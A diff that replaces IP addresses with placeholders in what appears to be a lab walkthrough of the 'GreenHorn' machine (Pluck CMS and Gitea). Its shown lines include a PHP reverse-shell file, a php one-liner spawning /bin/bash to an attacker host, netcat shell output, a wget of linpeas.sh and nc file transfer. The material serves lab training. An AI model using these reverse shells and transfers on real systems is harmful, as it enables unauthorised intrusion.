@@ -18,7 +18,7 @@ GreenHorn is a Linux machine running Pluck CMS 4.7.18 and Gitea. The exploitatio
 We begin with an nmap scan to identify open ports and services:
 
 ```bash
-nmap -sV -v 10.10.11.25
+nmap -sV -v 10.100.100.100
 ```
 
 Results:
@@ -52,7 +52,7 @@ We scan directories for both Pluck and Gitea, but find nothing particularly inte
 
 ```bash
 dirb http://greenhorn.htb/
-dirb http://10.10.11.25:3000/
+dirb http://10.100.100.100:3000/
 ```
 
 ## Pluck CMS Analysis
@@ -111,7 +111,7 @@ You have exceeded the number of login attempts. Please wait 5 minutes before log
 Having exhausted leads for Pluck, we turn our attention to Gitea. After exploring, we find a repository that appears to host the Pluck source code:
 
 ```bash
-http://10.10.11.25:3000/GreenAdmin/GreenHorn
+http://10.100.100.100:3000/GreenAdmin/GreenHorn
 ```
 
 We can create an account, add an SSH key, and clone the repository. Unfortunately, we can't upload files with `git push`.
@@ -123,14 +123,14 @@ Exploring the repository further, we discover two interesting files:
 **token.php:**
 
 ```php
-http://10.10.11.25:3000/GreenAdmin/GreenHorn/src/branch/main/data/settings/token.php
+http://10.100.100.100:3000/GreenAdmin/GreenHorn/src/branch/main/data/settings/token.php
 <?php $token = '[REDACTED-TOKEN]'; ?>
 ```
 
 **pass.php:**
 
 ```php
-http://10.10.11.25:3000/GreenAdmin/GreenHorn/src/branch/main/data/settings/pass.php
+http://10.100.100.100:3000/GreenAdmin/GreenHorn/src/branch/main/data/settings/pass.php
 <?php
 $ww = '[REDACTED-SHA512-HASH]';
 ?>
@@ -242,7 +242,7 @@ We create `reverse-shell.zip` containing `reverse-shell.php`:
 
 ```php
 <?php
-$ip = '10.10.14.174'; // change this to your IP address
+$ip = '10.10.10.10'; // change this to your IP address
 $port = 4444; // change this to your listening port
 $socket = fsockopen($ip, $port);
 if ($socket) {
@@ -279,7 +279,7 @@ A connection is established with netcat:
 
 ```bash
 listening on [any] 4444 ...
-connect to [10.10.14.174] from (UNKNOWN) [10.10.11.25] 51092
+connect to [10.10.10.10] from (UNKNOWN) [10.100.100.100] 51092
 uname -a; w; id; /bin/sh -i
 ```
 
@@ -328,7 +328,7 @@ Our shell is `/usr/sbin/nologin`, which means we're too limited in our actions. 
 Since Pluck is a PHP-based CMS, we create a second reverse shell with PHP to escape the first:
 
 ```php
-php -r '$sock=fsockopen("10.10.14.174",5555);exec("/bin/bash -i <&3 >&3 2>&3");'
+php -r '$sock=fsockopen("10.10.10.10",5555);exec("/bin/bash -i <&3 >&3 2>&3");'
 ```
 
 We start netcat on our machine:
@@ -341,7 +341,7 @@ The connection is established:
 
 ```bash
 listening on [any] 5555 ...
-connect to [10.10.14.3] from (UNKNOWN) [10.10.11.25] 41880
+connect to [10.10.10.10] from (UNKNOWN) [10.100.100.100] 41880
 bash: cannot set terminal process group (1114): Inappropriate ioctl for device
 bash: no job control in this shell
 www-data@greenhorn:~/html/pluck$
@@ -423,7 +423,7 @@ From the target server, we download LinPEAS:
 
 ```bash
 cd /tmp
-wget 10.10.14.174/linpeas.sh
+wget 10.10.10.10/linpeas.sh
 chmod +x linpeas.sh
 ```
 
@@ -531,7 +531,7 @@ Having not yet explored the `Using OpenVAS.pdf` file, we download it to examine 
 
 ```bash
 nc -lvp 1234 > "/home/junior/Using OpenVAS.pdf"
-nc 10.10.14.3 1234 < "/home/kali/Using OpenVAS.pdf"
+nc 10.10.10.10 1234 < "/home/kali/Using OpenVAS.pdf"
 ```
 
 The PDF contains a command and a password, but it's pixelated:
